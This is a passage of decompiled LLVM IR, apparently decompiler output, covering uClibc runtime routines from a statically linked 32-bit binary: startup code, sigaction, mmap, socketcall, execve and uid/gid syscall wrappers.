  store i32 %v1_8055279, i32* @global_var_806276c.536, align 4
  %v3_8055282 = load i32, i32* %arg3, align 4
  %v14_8055282 = icmp eq i32 %v1_8055279, %v3_8055282
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8055288 = icmp eq i1 %v14_8055282, false
  %v4_8055288 = select i1 %v1_8055288, i32 %v1_8055279, i32 %v3_8055276
  store i32 %v4_8055288, i32* @global_var_806276c.536, align 4
  %v2_8055290 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8055295 = bitcast i32* %stack_var_-136 to i8*
  %v4_8055295 = call i32 @__GI_memset(i8* %v3_8055295, i32 0, i32 120)
  %v0_805529a = load i32, i32* @global_var_806276c.536, align 4
  br label %dec_label_pc_80552a2

dec_label_pc_80552a2:                             ; preds = %dec_label_pc_80552a2, %entry
  %v0_80552a2 = phi i32 [ %v1_80552a5, %dec_label_pc_80552a2 ], [ %v0_805529a, %entry ]
  %v1_80552a2 = inttoptr i32 %v0_80552a2 to i32*
  %v2_80552a2 = load i32, i32* %v1_80552a2, align 4
  %v3_80552a2 = icmp eq i32 %v2_80552a2, 0
  %v1_80552a5 = add i32 %v0_80552a2, 4
  %v1_80552a8 = icmp eq i1 %v3_80552a2, false
  br i1 %v1_80552a8, label %dec_label_pc_80552a2, label %dec_label_pc_80552c9.preheader

dec_label_pc_80552c9.preheader:                   ; preds = %dec_label_pc_80552a2
  store i32 %v1_80552a5, i32* @ebx, align 4
  %v1_80552c91 = inttoptr i32 %v1_80552a5 to i32*
  %v2_80552c92 = load i32, i32* %v1_80552c91, align 4
  %v3_80552c93 = icmp eq i32 %v2_80552c92, 0
  %v1_80552cc10 = icmp eq i1 %v3_80552c93, false
  br i1 %v1_80552cc10, label %dec_label_pc_80552ae.lr.ph, label %dec_label_pc_80552ce

dec_label_pc_80552ae.lr.ph:                       ; preds = %dec_label_pc_80552c9.preheader
  %v3_8055286 = ptrtoint i32* %stack_var_-168 to i32
  %v3_80552b9 = add i32 %v3_8055286, 32
  br label %dec_label_pc_80552ae

dec_label_pc_80552ae:                             ; preds = %dec_label_pc_80552ae.lr.ph, %dec_label_pc_80552c6
  %v1_80552b9 = phi i32 [ %v2_80552c92, %dec_label_pc_80552ae.lr.ph ], [ %v2_80552c9, %dec_label_pc_80552c6 ]
  %v0_80552b8 = phi i32 [ %v1_80552a5, %dec_label_pc_80552ae.lr.ph ], [ %v1_80552c6, %dec_label_pc_80552c6 ]
  %v6_80552b3 = icmp ugt i32 %v1_80552b9, 14
  br i1 %v6_80552b3, label %dec_label_pc_80552c6, label %dec_label_pc_80552b5

dec_label_pc_80552b5:                             ; preds = %dec_label_pc_80552ae
  %v0_80552b5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80552b5, i32* %stack_var_-160, align 4
  store i32 %v0_80552b8, i32* %stack_var_-168, align 4
  %v2_80552b9 = mul i32 %v1_80552b9, 8
  %v4_80552b9 = add i32 %v3_80552b9, %v2_80552b9
  %v3_80552be = inttoptr i32 %v4_80552b9 to i16*
  %v4_80552be = call i32 @memcpy(i16* %v3_80552be, i32 %v0_80552b8, i32 8)
  %v0_80552c6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552c6

dec_label_pc_80552c6:                             ; preds = %dec_label_pc_80552ae, %dec_label_pc_80552b5
  %v0_80552c6 = phi i32 [ %v0_80552b8, %dec_label_pc_80552ae ], [ %v0_80552c6.pre, %dec_label_pc_80552b5 ]
  %v1_80552c6 = add i32 %v0_80552c6, 8
  store i32 %v1_80552c6, i32* @ebx, align 4
  %v1_80552c9 = inttoptr i32 %v1_80552c6 to i32*
  %v2_80552c9 = load i32, i32* %v1_80552c9, align 4
  %v3_80552c9 = icmp eq i32 %v2_80552c9, 0
  %v1_80552cc = icmp eq i1 %v3_80552c9, false
  br i1 %v1_80552cc, label %dec_label_pc_80552ae, label %dec_label_pc_80552ce

dec_label_pc_80552ce:                             ; preds = %dec_label_pc_80552c6, %dec_label_pc_80552c9.preheader
  store i32 %v2_8055290, i32* @eax, align 4
  %v0_80552d2 = call i32 @_dl_aux_init()
  store i32 %v0_80552d2, i32* @eax, align 4
  %v0_80552d7 = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_80552e5 = icmp eq i32 %tmp24, 0
  %v3_80552e7 = select i1 %v1_80552e5, i32 4096, i32 %tmp24
  %v13_80552ea = icmp eq i32 %tmp23, -1
  store i32 %v3_80552e7, i32* @global_var_8062770.465, align 16
  %v1_80552f4 = icmp eq i1 %v13_80552ea, false
  br i1 %v1_80552f4, label %dec_label_pc_805531f, label %dec_label_pc_80552f6

dec_label_pc_80552f6:                             ; preds = %dec_label_pc_80552ce
  %v0_80552f6 = call i32 @getuid()
  store i32 %v0_80552f6, i32* @ebx, align 4
  %v0_80552fd = call i32 @geteuid()
  %v0_8055302 = load i32, i32* @ebx, align 4
  %v12_8055302 = icmp eq i32 %v0_8055302, %v0_80552fd
  %v1_8055304 = icmp eq i1 %v12_8055302, false
  br i1 %v1_8055304, label %dec_label_pc_8055335, label %dec_label_pc_8055306

dec_label_pc_8055306:                             ; preds = %dec_label_pc_80552f6
  %v0_8055306 = call i32 @getgid()
  store i32 %v0_8055306, i32* @ebx, align 4
  %v0_805530d = call i32 @getegid()
  %v0_8055312 = load i32, i32* @ebx, align 4
  %v12_8055312 = icmp eq i32 %v0_8055312, %v0_805530d
  %v1_8055314 = icmp eq i1 %v12_8055312, false
  br i1 %v1_8055314, label %dec_label_pc_8055335, label %dec_label_pc_8055316.thread

dec_label_pc_8055316.thread:                      ; preds = %dec_label_pc_8055306
  br label %dec_label_pc_805535f

dec_label_pc_805531f:                             ; preds = %dec_label_pc_80552ce
  %v15_805531f = icmp eq i32 %tmp23, %tmp22
  %v1_8055323 = icmp eq i1 %v15_805531f, false
  br i1 %v1_8055323, label %dec_label_pc_8055335, label %dec_label_pc_8055325

dec_label_pc_8055325:                             ; preds = %dec_label_pc_805531f
  br label %dec_label_pc_8055335

dec_label_pc_8055335:                             ; preds = %dec_label_pc_8055325, %dec_label_pc_805531f, %dec_label_pc_8055306, %dec_label_pc_80552f6
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_805533c = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_805534b = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_805535a = call i32 @__check_one_fd()
  br label %dec_label_pc_805535f

dec_label_pc_805535f:                             ; preds = %dec_label_pc_8055316.thread, %dec_label_pc_8055335
  %v0_805535f = load i32, i32* @edi, align 4
  %v1_805535f = inttoptr i32 %v0_805535f to i32*
  %v2_805535f = load i32, i32* %v1_805535f, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_805535f, i32* inttoptr (i32 134595800 to i32*), align 8
  store i32 %arg5, i32* @global_var_8062774.540, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 0), label %dec_label_pc_8055384, label %dec_label_pc_8055390

dec_label_pc_8055384:                             ; preds = %dec_label_pc_805535f, %dec_label_pc_8055384
  %v4_805538453 = phi i32 [ %v1_805538b, %dec_label_pc_8055384 ], [ 0, %dec_label_pc_805535f ]
  store i32 ptrtoint (i32* @global_var_805538b.546 to i32), i32* %stack_var_-160, align 4
  %v5_8055384 = mul i32 %v4_805538453, 4
  %v6_8055384 = add i32 %v5_8055384, ptrtoint (i32* @global_var_805c000.538 to i32)
  %v7_8055384 = inttoptr i32 %v6_8055384 to i32*
  %v8_8055384 = load i32, i32* %v7_8055384, align 4
  call void @__pseudo_call(i32 %v8_8055384)
  %v0_805538b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805538b = add i32 %v0_805538b, 1
  store i32 %v1_805538b, i32* %ebx.global-to-local, align 4
  %v1_805538c = load i32, i32* %esi.global-to-local, align 4
  %v7_805538c = icmp ult i32 %v1_805538b, %v1_805538c
  br i1 %v7_805538c, label %dec_label_pc_8055384, label %dec_label_pc_8055390

dec_label_pc_8055390:                             ; preds = %dec_label_pc_8055384, %dec_label_pc_805535f
  store i32 134566806, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 0), label %dec_label_pc_80553a8, label %dec_label_pc_80553b4

dec_label_pc_80553a8:                             ; preds = %dec_label_pc_8055390, %dec_label_pc_80553a8
  %v4_80553a843 = phi i32 [ %v1_80553af, %dec_label_pc_80553a8 ], [ 0, %dec_label_pc_8055390 ]
  store i32 ptrtoint (i32* @global_var_80553af.547 to i32), i32* %stack_var_-160, align 4
  %v5_80553a8 = mul i32 %v4_80553a843, 4
  %v6_80553a8 = add i32 %v5_80553a8, ptrtoint (i32* @global_var_805c000.538 to i32)
  %v7_80553a8 = inttoptr i32 %v6_80553a8 to i32*
  %v8_80553a8 = load i32, i32* %v7_80553a8, align 4
  call void @__pseudo_call(i32 %v8_80553a8)
  %v0_80553af = load i32, i32* @ebx, align 4
  %v1_80553af = add i32 %v0_80553af, 1
  store i32 %v1_80553af, i32* @ebx, align 4
  %v1_80553b0.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80553b0 = icmp ult i32 %v1_80553af, %v1_80553b0.pre
  br i1 %v7_80553b0, label %dec_label_pc_80553a8, label %dec_label_pc_80553b4

dec_label_pc_80553b4:                             ; preds = %dec_label_pc_80553a8, %dec_label_pc_8055390
  %v0_80553bd = load i32, i32* %stack_var_-160, align 4
  %v1_80553bd = call i32 @__errno_location(i32 %v0_80553bd)
  %v1_80553c2 = inttoptr i32 %v1_80553bd to i32*
  store i32 0, i32* %v1_80553c2, align 4
  %v0_80553d1 = call i32 @__GI___h_errno_location()
  store i32 %v0_80553d1, i32* @eax, align 4
  %v1_80553d6 = inttoptr i32 %v0_80553d1 to i32*
  store i32 0, i32* %v1_80553d6, align 4
  %v0_80553dd = load i32, i32* @global_var_806276c.536, align 4
  store i32 %v0_80553dd, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_805523f)
  %v0_80553f2 = load i32, i32* @eax, align 4
  %v1_80553f5 = call i32 @__GI_exit(i32 %v0_80553f2)
  %v0_8055401 = load i32, i32* @ebx, align 4
  %v1_8055401 = inttoptr i32 %v0_8055401 to %sigcontext*
  %v2_8055401 = call i32 @sigreturn(%sigcontext* %v1_8055401)
  %v0_8055409 = load i32, i32* @ebx, align 4
  %v1_8055409 = inttoptr i32 %v0_8055409 to %sigcontext*
  %v2_8055409 = call i32 @sigreturn(%sigcontext* %v1_8055409)
  ret i32 %v2_8055409

; uselistorder directives
  uselistorder i32 %v1_80553af, { 1, 2, 0 }
  uselistorder i32 %v1_805538b, { 1, 2, 0 }
  uselistorder i32 %v2_80552c9, { 1, 0 }
  uselistorder i32 %v1_80552c6, { 2, 1, 0 }
  uselistorder i32 %v1_80552a5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80552a2, { 1, 0 }
  uselistorder i32 %v1_8055279, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32* %edx.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805c000.538 to i32), i32 -134594560), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_80553a8, { 1, 0 }
  uselistorder label %dec_label_pc_8055384, { 1, 0 }
  uselistorder label %dec_label_pc_805535f, { 1, 0 }
  uselistorder label %dec_label_pc_80552c6, { 1, 0 }
  uselistorder label %dec_label_pc_80552ae, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805540b = load i32, i32* @esi, align 4
  %v0_805540c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055421 = icmp eq i32* %arg2, null
  br i1 %v1_8055421, label %dec_label_pc_8055475, label %dec_label_pc_8055425

dec_label_pc_8055425:                             ; preds = %entry
  %v2_8055425 = load i32, i32* %arg2, align 4
  store i32 %v2_8055425, i32* %stack_var_-148, align 4
  %v1_805542e = add i32 %tmp11, 4
  %v3_8055440 = bitcast i32* %stack_var_-136 to i16*
  %v4_8055440 = call i32 @memcpy(i16* %v3_8055440, i32 %v1_805542e, i32 128)
  br label %dec_label_pc_8055475

dec_label_pc_8055475:                             ; preds = %entry, %dec_label_pc_8055425
  %v1_8055477 = icmp eq i32 %arg3, 0
  br i1 %v1_8055477, label %dec_label_pc_805547f, label %dec_label_pc_805547b

dec_label_pc_805547b:                             ; preds = %dec_label_pc_8055475
  %v2_805547b = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805547f

dec_label_pc_805547f:                             ; preds = %dec_label_pc_8055475, %dec_label_pc_805547b
  %v0_805548e = phi i32 [ 0, %dec_label_pc_8055475 ], [ %v2_805547b, %dec_label_pc_805547b ]
  br i1 %v1_8055421, label %dec_label_pc_805548c, label %dec_label_pc_8055485

dec_label_pc_8055485:                             ; preds = %dec_label_pc_805547f
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805548c

dec_label_pc_805548c:                             ; preds = %dec_label_pc_805547f, %dec_label_pc_8055485
  %v0_805548f = phi %sigaction* [ null, %dec_label_pc_805547f ], [ %phitmp, %dec_label_pc_8055485 ]
  %v5_8055497 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_805548f, i32 %v0_805548e, i32 8)
  store i32 %v5_8055497, i32* %ebx.global-to-local, align 4
  br i1 %v1_8055477, label %dec_label_pc_80554da, label %dec_label_pc_80554a5

dec_label_pc_80554a5:                             ; preds = %dec_label_pc_805548c
  %v2_80554a5 = icmp slt i32 %v5_8055497, 0
  br i1 %v2_80554a5, label %dec_label_pc_80554da, label %dec_label_pc_80554a9

dec_label_pc_80554a9:                             ; preds = %dec_label_pc_80554a5
  %v3_80554a9 = load i32, i32* %stack_var_-288, align 4
  %v2_80554ad = inttoptr i32 %arg3 to i32*
  store i32 %v3_80554a9, i32* %v2_80554ad, align 4
  %v2_80554b5 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80554ba = add i32 %arg3, 4
  %v3_80554be = inttoptr i32 %v1_80554ba to i16*
  %v4_80554be = call i32 @memcpy(i16* %v3_80554be, i32 %v2_80554b5, i32 128)
  %v2_80554c7 = add i32 %arg3, 132
  %v3_80554c7 = inttoptr i32 %v2_80554c7 to i32*
  %v2_80554d4 = add i32 %arg3, 136
  %v3_80554d4 = inttoptr i32 %v2_80554d4 to i32*
  %v0_80554e0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80554da

dec_label_pc_80554da:                             ; preds = %dec_label_pc_80554a5, %dec_label_pc_805548c, %dec_label_pc_80554a9
  %v0_80554e0 = phi i32 [ %v5_8055497, %dec_label_pc_80554a5 ], [ %v5_8055497, %dec_label_pc_805548c ], [ %v0_80554e0.pre, %dec_label_pc_80554a9 ]
  store i32 %v0_805540c, i32* @ebx, align 4
  store i32 %v0_805540b, i32* @esi, align 4
  ret i32 %v0_80554e0

; uselistorder directives
  uselistorder i1 %v1_8055477, { 1, 0 }
  uselistorder i1 %v1_8055421, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 3 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80554da, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805548c, { 1, 0 }
  uselistorder label %dec_label_pc_805547f, { 1, 0 }
  uselistorder label %dec_label_pc_8055475, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_80554eb = load i32, i32* @eax, align 4
  %v1_80554ed = sub i32 0, %v0_80554eb
  %v1_80554ef = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_80554f4 = inttoptr i32 %v1_80554ef to i32*
  store i32 %v1_80554ed, i32* %v2_80554f4, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8055500 = load i32, i32* @ebx, align 4
  %v2_8055507 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8055507, i32* @ebx, align 4
  %v8_805550b = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8055500, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_805550b, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134567144)
  ret i32 %v8_805550b

; uselistorder directives
  uselistorder i32 %v8_805550b, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134567144, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805551c = load i32, i32* @ebx, align 4
  store i32 %v0_805551c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805552f = call i32 @int80_syscall(i32 102)
  store i32 %v1_805552f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805552f, -4095
  br i1 %tmp, label %dec_label_pc_8055548, label %dec_label_pc_805553c

dec_label_pc_805553c:                             ; preds = %entry
  %v0_805553c = load i32, i32* %stack_var_-4, align 4
  %v1_805553c = call i32 @__errno_location(i32 %v0_805553c)
  %v0_8055541 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055541 = sub i32 0, %v0_8055541
  %v2_8055543 = inttoptr i32 %v1_805553c to i32*
  store i32 %v1_8055541, i32* %v2_8055543, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055548

dec_label_pc_8055548:                             ; preds = %entry, %dec_label_pc_805553c
  %v0_8055549 = phi i32 [ %v1_805552f, %entry ], [ -1, %dec_label_pc_805553c ]
  %v2_8055548 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055548, i32* @edx, align 4
  %v2_805554c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805554c, i32* @ebx, align 4
  ret i32 %v0_8055549

; uselistorder directives
  uselistorder i32 %v1_805552f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055548, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055551 = load i32, i32* @esi, align 4
  store i32 %v0_8055551, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8055565 = load i32, i32* @ebx, align 4
  %v7_805556d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805556d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805556d, -4095
  br i1 %tmp, label %dec_label_pc_8055585, label %dec_label_pc_8055579

dec_label_pc_8055579:                             ; preds = %entry
  %v1_8055579 = call i32 @__errno_location(i32 %v0_8055565)
  %v0_805557e = load i32, i32* %esi.global-to-local, align 4
  %v1_805557e = sub i32 0, %v0_805557e
  %v2_8055580 = inttoptr i32 %v1_8055579 to i32*
  store i32 %v1_805557e, i32* %v2_8055580, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055585

dec_label_pc_8055585:                             ; preds = %entry, %dec_label_pc_8055579
  %v0_8055586 = phi i32 [ %v7_805556d, %entry ], [ -1, %dec_label_pc_8055579 ]
  %v2_8055585 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055585, i32* @edx, align 4
  %v2_8055588 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055588, i32* @esi, align 4
  ret i32 %v0_8055586

; uselistorder directives
  uselistorder i32 %v7_805556d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055585, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805558c = load i32, i32* @ebx, align 4
  store i32 %v0_805558c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805559f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805559f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805559f, -4095
  br i1 %tmp, label %dec_label_pc_80555b8, label %dec_label_pc_80555ac

dec_label_pc_80555ac:                             ; preds = %entry
  %v0_80555ac = load i32, i32* %stack_var_-4, align 4
  %v1_80555ac = call i32 @__errno_location(i32 %v0_80555ac)
  %v0_80555b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80555b1 = sub i32 0, %v0_80555b1
  %v2_80555b3 = inttoptr i32 %v1_80555ac to i32*
  store i32 %v1_80555b1, i32* %v2_80555b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80555b8

dec_label_pc_80555b8:                             ; preds = %entry, %dec_label_pc_80555ac
  %v0_80555b9 = phi i32 [ %v4_805559f, %entry ], [ -1, %dec_label_pc_80555ac ]
  %v2_80555b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80555b8, i32* @edx, align 4
  %v2_80555bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80555bc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80555b9

; uselistorder directives
  uselistorder i32 %v4_805559f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80555b8, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80555c0 = load i32, i32* @edi, align 4
  store i32 %v0_80555c0, i32* %stack_var_-4, align 4
  %v4_80555c4 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80555c4, i32* %edi.global-to-local, align 4
  %v0_80555d0 = load i32, i32* @ebx, align 4
  %v5_80555d8 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80555d8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80555d8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80555d8, [1 x i8*] %v8_80555d8)
  store i32 %v9_80555d8, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80555d8, -4095
  br i1 %tmp12, label %dec_label_pc_80555f0, label %dec_label_pc_80555e4

dec_label_pc_80555e4:                             ; preds = %entry
  %v1_80555e4 = call i32 @__errno_location(i32 %v0_80555d0)
  %v0_80555e9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80555e9 = sub i32 0, %v0_80555e9
  %v2_80555eb = inttoptr i32 %v1_80555e4 to i32*
  store i32 %v1_80555e9, i32* %v2_80555eb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80555f0

dec_label_pc_80555f0:                             ; preds = %entry, %dec_label_pc_80555e4
  %v0_80555f1 = phi i32 [ %v9_80555d8, %entry ], [ -1, %dec_label_pc_80555e4 ]
  %v2_80555f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80555f0, i32* @edx, align 4
  %v2_80555f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80555f4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80555f1

; uselistorder directives
  uselistorder i32 %v9_80555d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80555f0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80555f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80555f8, i32* %stack_var_-4, align 4
  %v1_8055601 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055601, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055601, -4095
  br i1 %tmp, label %dec_label_pc_8055618, label %dec_label_pc_805560c

dec_label_pc_805560c:                             ; preds = %entry
  %v0_805560c = load i32, i32* %stack_var_-4, align 4
  %v1_805560c = call i32 @__errno_location(i32 %v0_805560c)
  %v0_8055611 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055611 = sub i32 0, %v0_8055611
  %v2_8055613 = inttoptr i32 %v1_805560c to i32*
  store i32 %v1_8055611, i32* %v2_8055613, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055618

dec_label_pc_8055618:                             ; preds = %entry, %dec_label_pc_805560c
  %v0_8055619 = phi i32 [ %v1_8055601, %entry ], [ -1, %dec_label_pc_805560c ]
  %v2_805561c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805561c, i32* @ebx, align 4
  ret i32 %v0_8055619

; uselistorder directives
  uselistorder i32 %v1_8055601, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8055618, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055620 = load i32, i32* @ebx, align 4
  store i32 %v0_8055620, i32* %stack_var_-4, align 4
  %v1_8055629 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8055629, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055629, -4095
  br i1 %tmp, label %dec_label_pc_8055640, label %dec_label_pc_8055634

dec_label_pc_8055634:                             ; preds = %entry
  %v0_8055634 = load i32, i32* %stack_var_-4, align 4
  %v1_8055634 = call i32 @__errno_location(i32 %v0_8055634)
  %v0_8055639 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055639 = sub i32 0, %v0_8055639
  %v2_805563b = inttoptr i32 %v1_8055634 to i32*
  store i32 %v1_8055639, i32* %v2_805563b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055640

dec_label_pc_8055640:                             ; preds = %entry, %dec_label_pc_8055634
  %v0_8055641 = phi i32 [ %v1_8055629, %entry ], [ -1, %dec_label_pc_8055634 ]
  %v2_8055644 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055644, i32* @ebx, align 4
  ret i32 %v0_8055641

; uselistorder directives
  uselistorder i32 %v1_8055629, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8055640, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055648 = load i32, i32* @ebx, align 4
  store i32 %v0_8055648, i32* %stack_var_-4, align 4
  %v1_8055651 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8055651, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055651, -4095
  br i1 %tmp, label %dec_label_pc_8055668, label %dec_label_pc_805565c

dec_label_pc_805565c:                             ; preds = %entry
